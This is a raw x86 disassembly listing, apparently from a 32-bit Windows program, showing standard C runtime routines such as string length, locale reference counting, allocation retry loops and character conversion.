  4046d1:	50                   	push   %eax
  4046d2:	ff d6                	call   *%esi
  4046d4:	8b 87 b4 00 00 00    	mov    0xb4(%edi),%eax
  4046da:	85 c0                	test   %eax,%eax
  4046dc:	74 03                	je     0x4046e1
  4046de:	50                   	push   %eax
  4046df:	ff d6                	call   *%esi
  4046e1:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  4046e7:	85 c0                	test   %eax,%eax
  4046e9:	74 03                	je     0x4046ee
  4046eb:	50                   	push   %eax
  4046ec:	ff d6                	call   *%esi
  4046ee:	8d 5f 50             	lea    0x50(%edi),%ebx
  4046f1:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  4046f8:	81 7b f8 48 da 40 00 	cmpl   $0x40da48,-0x8(%ebx)
  4046ff:	74 09                	je     0x40470a
  404701:	8b 03                	mov    (%ebx),%eax
  404703:	85 c0                	test   %eax,%eax
  404705:	74 03                	je     0x40470a
  404707:	50                   	push   %eax
  404708:	ff d6                	call   *%esi
  40470a:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  40470e:	74 0a                	je     0x40471a
  404710:	8b 43 04             	mov    0x4(%ebx),%eax
  404713:	85 c0                	test   %eax,%eax
  404715:	74 03                	je     0x40471a
  404717:	50                   	push   %eax
  404718:	ff d6                	call   *%esi
  40471a:	83 c3 10             	add    $0x10,%ebx
  40471d:	ff 4d 08             	decl   0x8(%ebp)
  404720:	75 d6                	jne    0x4046f8
  404722:	8b 87 d4 00 00 00    	mov    0xd4(%edi),%eax
  404728:	05 b4 00 00 00       	add    $0xb4,%eax
  40472d:	50                   	push   %eax
  40472e:	ff d6                	call   *%esi
  404730:	5e                   	pop    %esi
  404731:	5b                   	pop    %ebx
  404732:	8b c7                	mov    %edi,%eax
  404734:	5f                   	pop    %edi
  404735:	5d                   	pop    %ebp
  404736:	c3                   	ret
  404737:	85 ff                	test   %edi,%edi
  404739:	74 37                	je     0x404772
  40473b:	85 c0                	test   %eax,%eax
  40473d:	74 33                	je     0x404772
  40473f:	56                   	push   %esi
  404740:	8b 30                	mov    (%eax),%esi
  404742:	3b f7                	cmp    %edi,%esi
  404744:	74 28                	je     0x40476e
  404746:	57                   	push   %edi
  404747:	89 38                	mov    %edi,(%eax)
  404749:	e8 c1 fe ff ff       	call   0x40460f
  40474e:	59                   	pop    %ecx
  40474f:	85 f6                	test   %esi,%esi
  404751:	74 1b                	je     0x40476e
  404753:	56                   	push   %esi
  404754:	e8 45 ff ff ff       	call   0x40469e
  404759:	83 3e 00             	cmpl   $0x0,(%esi)
  40475c:	59                   	pop    %ecx
  40475d:	75 0f                	jne    0x40476e
  40475f:	81 fe 50 da 40 00    	cmp    $0x40da50,%esi
  404765:	74 07                	je     0x40476e
  404767:	56                   	push   %esi
  404768:	e8 59 fd ff ff       	call   0x4044c6
  40476d:	59                   	pop    %ecx
  40476e:	8b c7                	mov    %edi,%eax
  404770:	5e                   	pop    %esi
  404771:	c3                   	ret
  404772:	33 c0                	xor    %eax,%eax
  404774:	c3                   	ret
  404775:	6a 0c                	push   $0xc
  404777:	68 a8 b6 40 00       	push   $0x40b6a8
  40477c:	e8 9f e7 ff ff       	call   0x402f20
  404781:	e8 93 e4 ff ff       	call   0x402c19
  404786:	8b f0                	mov    %eax,%esi
  404788:	a1 44 da 40 00       	mov    0x40da44,%eax
  40478d:	85 46 70             	test   %eax,0x70(%esi)
  404790:	74 22                	je     0x4047b4
  404792:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  404796:	74 1c                	je     0x4047b4
  404798:	e8 7c e4 ff ff       	call   0x402c19
  40479d:	8b 70 6c             	mov    0x6c(%eax),%esi
  4047a0:	85 f6                	test   %esi,%esi
  4047a2:	75 08                	jne    0x4047ac
  4047a4:	6a 20                	push   $0x20
  4047a6:	e8 f1 d3 ff ff       	call   0x401b9c
  4047ab:	59                   	pop    %ecx
  4047ac:	8b c6                	mov    %esi,%eax
  4047ae:	e8 b2 e7 ff ff       	call   0x402f65
  4047b3:	c3                   	ret
  4047b4:	6a 0c                	push   $0xc
  4047b6:	e8 9b 13 00 00       	call   0x405b56
  4047bb:	59                   	pop    %ecx
  4047bc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4047c0:	8d 46 6c             	lea    0x6c(%esi),%eax
  4047c3:	8b 3d 28 db 40 00    	mov    0x40db28,%edi
  4047c9:	e8 69 ff ff ff       	call   0x404737
  4047ce:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4047d1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4047d8:	e8 02 00 00 00       	call   0x4047df
  4047dd:	eb c1                	jmp    0x4047a0
  4047df:	6a 0c                	push   $0xc
  4047e1:	e8 96 12 00 00       	call   0x405a7c
  4047e6:	59                   	pop    %ecx
  4047e7:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4047ea:	c3                   	ret
  4047eb:	6a 0c                	push   $0xc
  4047ed:	68 c8 b6 40 00       	push   $0x40b6c8
  4047f2:	e8 29 e7 ff ff       	call   0x402f20
  4047f7:	8b 75 08             	mov    0x8(%ebp),%esi
  4047fa:	85 f6                	test   %esi,%esi
  4047fc:	74 75                	je     0x404873
  4047fe:	83 3d a8 f9 40 00 03 	cmpl   $0x3,0x40f9a8
  404805:	75 43                	jne    0x40484a
  404807:	6a 04                	push   $0x4
  404809:	e8 48 13 00 00       	call   0x405b56
  40480e:	59                   	pop    %ecx
  40480f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404813:	56                   	push   %esi
  404814:	e8 fc 1f 00 00       	call   0x406815
  404819:	59                   	pop    %ecx
  40481a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40481d:	85 c0                	test   %eax,%eax
  40481f:	74 09                	je     0x40482a
  404821:	56                   	push   %esi
  404822:	50                   	push   %eax
  404823:	e8 1d 20 00 00       	call   0x406845
  404828:	59                   	pop    %ecx
  404829:	59                   	pop    %ecx
  40482a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404831:	e8 0b 00 00 00       	call   0x404841
  404836:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40483a:	75 37                	jne    0x404873
  40483c:	ff 75 08             	push   0x8(%ebp)
  40483f:	eb 0a                	jmp    0x40484b
  404841:	6a 04                	push   $0x4
  404843:	e8 34 12 00 00       	call   0x405a7c
  404848:	59                   	pop    %ecx
  404849:	c3                   	ret
  40484a:	56                   	push   %esi
  40484b:	6a 00                	push   $0x0
  40484d:	ff 35 7c e3 40 00    	push   0x40e37c
  404853:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  404859:	85 c0                	test   %eax,%eax
  40485b:	75 16                	jne    0x404873
  40485d:	e8 1d d1 ff ff       	call   0x40197f
  404862:	8b f0                	mov    %eax,%esi
  404864:	ff 15 8c a0 40 00    	call   *0x40a08c
  40486a:	50                   	push   %eax
  40486b:	e8 cd d0 ff ff       	call   0x40193d
  404870:	89 06                	mov    %eax,(%esi)
  404872:	59                   	pop    %ecx
  404873:	e8 ed e6 ff ff       	call   0x402f65
  404878:	c3                   	ret
  404879:	8b ff                	mov    %edi,%edi
  40487b:	56                   	push   %esi
  40487c:	57                   	push   %edi
  40487d:	33 ff                	xor    %edi,%edi
  40487f:	8d b7 38 db 40 00    	lea    0x40db38(%edi),%esi
  404885:	ff 36                	push   (%esi)
  404887:	e8 c6 e0 ff ff       	call   0x402952
  40488c:	83 c7 04             	add    $0x4,%edi
  40488f:	59                   	pop    %ecx
  404890:	89 06                	mov    %eax,(%esi)
  404892:	83 ff 28             	cmp    $0x28,%edi
  404895:	72 e8                	jb     0x40487f
  404897:	5f                   	pop    %edi
  404898:	5e                   	pop    %esi
  404899:	c3                   	ret
  40489a:	8b ff                	mov    %edi,%edi
  40489c:	55                   	push   %ebp
  40489d:	8b ec                	mov    %esp,%ebp
  40489f:	56                   	push   %esi
  4048a0:	57                   	push   %edi
  4048a1:	33 f6                	xor    %esi,%esi
  4048a3:	ff 75 08             	push   0x8(%ebp)
  4048a6:	e8 8d 3b 00 00       	call   0x408438
  4048ab:	8b f8                	mov    %eax,%edi
  4048ad:	59                   	pop    %ecx
  4048ae:	85 ff                	test   %edi,%edi
  4048b0:	75 27                	jne    0x4048d9
  4048b2:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  4048b8:	76 1f                	jbe    0x4048d9
  4048ba:	56                   	push   %esi
  4048bb:	ff 15 6c a0 40 00    	call   *0x40a06c
  4048c1:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  4048c7:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  4048cd:	76 03                	jbe    0x4048d2
  4048cf:	83 c8 ff             	or     $0xffffffff,%eax
  4048d2:	8b f0                	mov    %eax,%esi
  4048d4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4048d7:	75 ca                	jne    0x4048a3
  4048d9:	8b c7                	mov    %edi,%eax
  4048db:	5f                   	pop    %edi
  4048dc:	5e                   	pop    %esi
  4048dd:	5d                   	pop    %ebp
  4048de:	c3                   	ret
  4048df:	8b ff                	mov    %edi,%edi
  4048e1:	55                   	push   %ebp
  4048e2:	8b ec                	mov    %esp,%ebp
  4048e4:	56                   	push   %esi
  4048e5:	57                   	push   %edi
  4048e6:	33 f6                	xor    %esi,%esi
  4048e8:	6a 00                	push   $0x0
  4048ea:	ff 75 0c             	push   0xc(%ebp)
  4048ed:	ff 75 08             	push   0x8(%ebp)
  4048f0:	e8 0d 3c 00 00       	call   0x408502
  4048f5:	8b f8                	mov    %eax,%edi
  4048f7:	83 c4 0c             	add    $0xc,%esp
  4048fa:	85 ff                	test   %edi,%edi
  4048fc:	75 27                	jne    0x404925
  4048fe:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  404904:	76 1f                	jbe    0x404925
  404906:	56                   	push   %esi
  404907:	ff 15 6c a0 40 00    	call   *0x40a06c
  40490d:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  404913:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  404919:	76 03                	jbe    0x40491e
  40491b:	83 c8 ff             	or     $0xffffffff,%eax
  40491e:	8b f0                	mov    %eax,%esi
  404920:	83 f8 ff             	cmp    $0xffffffff,%eax
  404923:	75 c3                	jne    0x4048e8
  404925:	8b c7                	mov    %edi,%eax
  404927:	5f                   	pop    %edi
  404928:	5e                   	pop    %esi
  404929:	5d                   	pop    %ebp
  40492a:	c3                   	ret
  40492b:	8b ff                	mov    %edi,%edi
  40492d:	55                   	push   %ebp
  40492e:	8b ec                	mov    %esp,%ebp
  404930:	56                   	push   %esi
  404931:	57                   	push   %edi
  404932:	33 f6                	xor    %esi,%esi
  404934:	ff 75 0c             	push   0xc(%ebp)
  404937:	ff 75 08             	push   0x8(%ebp)
  40493a:	e8 e1 3c 00 00       	call   0x408620
  40493f:	8b f8                	mov    %eax,%edi
  404941:	59                   	pop    %ecx
  404942:	59                   	pop    %ecx
  404943:	85 ff                	test   %edi,%edi
  404945:	75 2c                	jne    0x404973
  404947:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40494a:	74 27                	je     0x404973
  40494c:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  404952:	76 1f                	jbe    0x404973
  404954:	56                   	push   %esi
  404955:	ff 15 6c a0 40 00    	call   *0x40a06c
  40495b:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  404961:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  404967:	76 03                	jbe    0x40496c
  404969:	83 c8 ff             	or     $0xffffffff,%eax
  40496c:	8b f0                	mov    %eax,%esi
  40496e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404971:	75 c1                	jne    0x404934
  404973:	8b c7                	mov    %edi,%eax
  404975:	5f                   	pop    %edi
  404976:	5e                   	pop    %esi
  404977:	5d                   	pop    %ebp
  404978:	c3                   	ret
  404979:	a1 60 db 40 00       	mov    0x40db60,%eax
  40497e:	83 c8 01             	or     $0x1,%eax
  404981:	33 c9                	xor    %ecx,%ecx
  404983:	39 05 c8 e3 40 00    	cmp    %eax,0x40e3c8
  404989:	0f 94 c1             	sete   %cl
  40498c:	8b c1                	mov    %ecx,%eax
  40498e:	c3                   	ret
  40498f:	cc                   	int3
  404990:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404994:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40499a:	74 24                	je     0x4049c0
  40499c:	8a 01                	mov    (%ecx),%al
  40499e:	83 c1 01             	add    $0x1,%ecx
  4049a1:	84 c0                	test   %al,%al
  4049a3:	74 4e                	je     0x4049f3
  4049a5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4049ab:	75 ef                	jne    0x40499c
  4049ad:	05 00 00 00 00       	add    $0x0,%eax
  4049b2:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4049b9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4049c0:	8b 01                	mov    (%ecx),%eax
  4049c2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4049c7:	03 d0                	add    %eax,%edx
  4049c9:	83 f0 ff             	xor    $0xffffffff,%eax
  4049cc:	33 c2                	xor    %edx,%eax
  4049ce:	83 c1 04             	add    $0x4,%ecx
  4049d1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4049d6:	74 e8                	je     0x4049c0
  4049d8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4049db:	84 c0                	test   %al,%al
  4049dd:	74 32                	je     0x404a11
  4049df:	84 e4                	test   %ah,%ah
  4049e1:	74 24                	je     0x404a07
  4049e3:	a9 00 00 ff 00       	test   $0xff0000,%eax
  4049e8:	74 13                	je     0x4049fd
  4049ea:	a9 00 00 00 ff       	test   $0xff000000,%eax
  4049ef:	74 02                	je     0x4049f3
  4049f1:	eb cd                	jmp    0x4049c0
  4049f3:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4049f6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4049fa:	2b c1                	sub    %ecx,%eax
  4049fc:	c3                   	ret
  4049fd:	8d 41 fe             	lea    -0x2(%ecx),%eax
  404a00:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a04:	2b c1                	sub    %ecx,%eax
  404a06:	c3                   	ret
  404a07:	8d 41 fd             	lea    -0x3(%ecx),%eax
  404a0a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a0e:	2b c1                	sub    %ecx,%eax
  404a10:	c3                   	ret
  404a11:	8d 41 fc             	lea    -0x4(%ecx),%eax
  404a14:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a18:	2b c1                	sub    %ecx,%eax
  404a1a:	c3                   	ret
  404a1b:	8b ff                	mov    %edi,%edi
  404a1d:	55                   	push   %ebp
  404a1e:	8b ec                	mov    %esp,%ebp
  404a20:	83 ec 10             	sub    $0x10,%esp
  404a23:	53                   	push   %ebx
  404a24:	56                   	push   %esi
  404a25:	8b 75 0c             	mov    0xc(%ebp),%esi
  404a28:	33 db                	xor    %ebx,%ebx
  404a2a:	57                   	push   %edi
  404a2b:	8b 7d 10             	mov    0x10(%ebp),%edi
  404a2e:	3b f3                	cmp    %ebx,%esi
  404a30:	75 14                	jne    0x404a46
  404a32:	3b fb                	cmp    %ebx,%edi
  404a34:	76 10                	jbe    0x404a46
  404a36:	8b 45 08             	mov    0x8(%ebp),%eax
  404a39:	3b c3                	cmp    %ebx,%eax
  404a3b:	74 02                	je     0x404a3f
  404a3d:	89 18                	mov    %ebx,(%eax)
  404a3f:	33 c0                	xor    %eax,%eax
  404a41:	e9 83 00 00 00       	jmp    0x404ac9
  404a46:	8b 45 08             	mov    0x8(%ebp),%eax
  404a49:	3b c3                	cmp    %ebx,%eax
  404a4b:	74 03                	je     0x404a50
  404a4d:	83 08 ff             	orl    $0xffffffff,(%eax)
  404a50:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  404a56:	76 1b                	jbe    0x404a73
  404a58:	e8 22 cf ff ff       	call   0x40197f
  404a5d:	6a 16                	push   $0x16
  404a5f:	5e                   	pop    %esi
  404a60:	53                   	push   %ebx
  404a61:	53                   	push   %ebx
  404a62:	53                   	push   %ebx
  404a63:	53                   	push   %ebx
  404a64:	53                   	push   %ebx
  404a65:	89 30                	mov    %esi,(%eax)
  404a67:	e8 ab ce ff ff       	call   0x401917
  404a6c:	83 c4 14             	add    $0x14,%esp
  404a6f:	8b c6                	mov    %esi,%eax
  404a71:	eb 56                	jmp    0x404ac9
  404a73:	ff 75 18             	push   0x18(%ebp)
  404a76:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404a79:	e8 db cc ff ff       	call   0x401759
  404a7e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a81:	39 58 14             	cmp    %ebx,0x14(%eax)
  404a84:	0f 85 9c 00 00 00    	jne    0x404b26
  404a8a:	66 8b 45 14          	mov    0x14(%ebp),%ax
  404a8e:	b9 ff 00 00 00       	mov    $0xff,%ecx
  404a93:	66 3b c1             	cmp    %cx,%ax
  404a96:	76 36                	jbe    0x404ace
  404a98:	3b f3                	cmp    %ebx,%esi
  404a9a:	74 0f                	je     0x404aab
  404a9c:	3b fb                	cmp    %ebx,%edi
  404a9e:	76 0b                	jbe    0x404aab
  404aa0:	57                   	push   %edi
  404aa1:	53                   	push   %ebx
  404aa2:	56                   	push   %esi
  404aa3:	e8 f8 01 00 00       	call   0x404ca0
  404aa8:	83 c4 0c             	add    $0xc,%esp
  404aab:	e8 cf ce ff ff       	call   0x40197f
  404ab0:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  404ab6:	e8 c4 ce ff ff       	call   0x40197f
  404abb:	8b 00                	mov    (%eax),%eax
  404abd:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  404ac0:	74 07                	je     0x404ac9
  404ac2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ac5:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  404ac9:	5f                   	pop    %edi
